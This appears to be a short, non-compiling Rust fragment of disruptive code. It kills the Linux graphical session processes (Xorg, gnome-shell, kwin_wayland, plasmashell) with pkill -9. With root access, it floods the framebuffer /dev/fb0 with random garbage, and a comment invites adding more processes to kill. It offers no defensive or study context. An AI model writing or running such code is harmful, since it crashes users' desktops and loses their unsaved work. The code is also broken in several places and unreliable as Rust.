#![no_main]
use std::process; 
use std::io::Error;  
use rand::{Rng, thread_rng};

extern "C" { 
    fn check_root() -> i32;
}

// Pfff its to light for this project, but why not 
fn artifacts_and_kill(root: bool) -> Result<(), std::io::Error> {
    std::process::Command::new("pkill")
    .args(&["-9", "Xorg", "xinit", "gnome-shell", "kwin_wayland", "plasmashell"]) 
    //TODO: Add more process names of the processes you want to kill
    .spawn().unwrap();

    if root == true && let Ok(fb) = std::fs::File::create("/dev/fb0"){
        let mut rng = rand::thread_rng();
        for _ in 0..1000 {
            let garbage: Vec<u8> = (0..1024).map(|_| rng.gen()).collect();
            let _ = fb.write(&garbage);
        }
    }
}


fn init() -> Result<(), std::io::Error> {
    if check_root() == 0 {
        artifacts_and_kill(true)
    } else {
        artifacts_and_kill(false)
    }
}

